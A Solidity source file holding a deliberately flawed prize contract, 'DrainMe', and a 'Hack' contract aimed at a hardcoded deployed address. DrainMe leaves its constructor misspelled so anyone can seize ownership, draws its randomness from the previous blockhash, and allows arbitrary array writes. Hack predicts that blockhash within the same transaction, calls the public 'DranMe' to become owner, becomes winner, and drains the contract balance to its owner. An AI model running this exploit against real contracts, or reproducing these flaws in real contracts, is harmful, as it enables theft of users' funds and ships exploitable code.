1 pragma solidity ^0.4.23;
2 
3 contract DrainMe {  
4 
5 //constants
6 
7 address public winner = 0x0;
8 address public owner;
9 address public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
10 address public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
11 address[] public players;
12 
13 mapping(address=>bool) approvedPlayers;
14 
15 uint256 public secret;
16 uint256[] public seed = [951828771,158769871220];
17 uint256[] public balance;
18 
19 //constructor
20 
21 function DranMe() public payable{
22 	owner = msg.sender;
23 }
24 
25 //modifiers
26 
27 modifier onlyOwner() {
28     require(msg.sender == owner);
29     _;
30 }
31 
32 modifier onlyWinner() {
33     require(msg.sender == winner);
34     _;
35 }
36 
37 modifier onlyPlayers() {
38     require(approvedPlayers[msg.sender]);
39     _;
40 }
41 
42 //functions
43 
44 function getLength() public constant returns(uint256) {
45 	return seed.length;
46 }
47 
48 function setSecret(uint256 _secret) public payable onlyOwner{
49 	secret = _secret;
50 }
51 
52 function getPlayerCount() public constant returns(uint256) {
53 	return players.length;
54 }
55 
56 function getPrize() public constant returns(uint256) {
57 	return address(this).balance;
58 }
59 
60 function becomePlayer() public payable{
61 	require(msg.value >= 0.02 ether);
62 	players.push(msg.sender);
63 	approvedPlayers[msg.sender]=true;
64 }
65 
66 function manipulateSecret() public payable onlyPlayers{
67 	require (msg.value >= 0.01 ether);
68 	if(msg.sender!=owner || unlockSecret()){
69 	    uint256 amount = 0;
70         msg.sender.transfer(amount);
71 	}
72 }
73 
74 event str(uint256);
75 
76 function unlockSecret() private returns(bool){
77     bytes32 hash = keccak256(blockhash(block.number-1));
78     
79     uint256 secret = uint256(hash);
80     str(secret);
81         if(secret%5==0){
82             winner = msg.sender;
83             return true;
84         }
85         else{
86             return false;
87         }
88     }
89 
90 function callFirstTarget () public payable onlyPlayers {
91 	require (msg.value >= 0.005 ether);
92 	firstTarget.call.value(msg.value)();
93 }
94 
95 function callSecondTarget () public payable onlyPlayers {
96 	require (msg.value >= 0.005 ether);
97 	secondTarget.call.value(msg.value)();
98 }
99 
100 function setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {
101 	seed[_index] = _value;
102 }
103 	
104 function addSeed (uint256 _add) public payable onlyPlayers {
105 	seed.length = _add;
106 }
107 
108 function guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {
109 	return (_seed / (seed[0]*seed[1]));
110 	if((_seed / (seed[0]*seed[1])) == secret) {
111 		owner = winner;
112 	}
113 }
114 
115 function checkSecret () public payable onlyPlayers returns(bool) {
116     require(msg.value >= 0.01 ether);
117     if(msg.value == secret){
118         return true;
119     }
120 }
121 
122 function winPrize() public payable onlyOwner {
123 	owner.call.value(1 wei)();
124 }
125 
126 function claimPrize() public payable onlyWinner {
127 	winner.transfer(address(this).balance);
128 }
129 
130 //fallback function
131 
132 function() public payable{
133 	}
134 }
135 
136 contract Hack{
137     
138     DrainMe contr = DrainMe(0xB620CeE6B52f96f3C6b253E6eEa556Aa2d214a99);
139     
140     address owner;
141     
142     function Hack(){
143         owner = msg.sender;
144     }
145     
146     //function put() payable public {
147      //   require(msg.sender == owner);
148      //   address(contr).transfer(msg.value);
149     //}
150     
151     function putHere() payable public {
152         require (msg.value >= 0.03 ether);
153         require(msg.sender == owner);
154     }
155     
156     event test1(bool);
157     event what(uint256);
158     function test() public payable {
159         //require (msg.value >= 0.03 ether);
160         require(msg.sender == owner);
161         bytes32 hash = keccak256(blockhash(block.number-1));
162         uint256 secret = uint256(hash);
163         what(secret);
164         if(secret%5==0){
165             contr.DranMe();
166             contr.becomePlayer.value(0.02 ether)();
167             contr.manipulateSecret.value(0.01 ether)();
168             contr.claimPrize();
169             msg.sender.transfer(address(this).balance);
170             test1(true);
171         }
172         else{
173             test1(false);
174         }
175         
176     }
177       
178     function take() public {
179         require(msg.sender == owner);
180         msg.sender.transfer(address(this).balance);
181     }
182     
183     function() public payable {}
184     
185     
186 }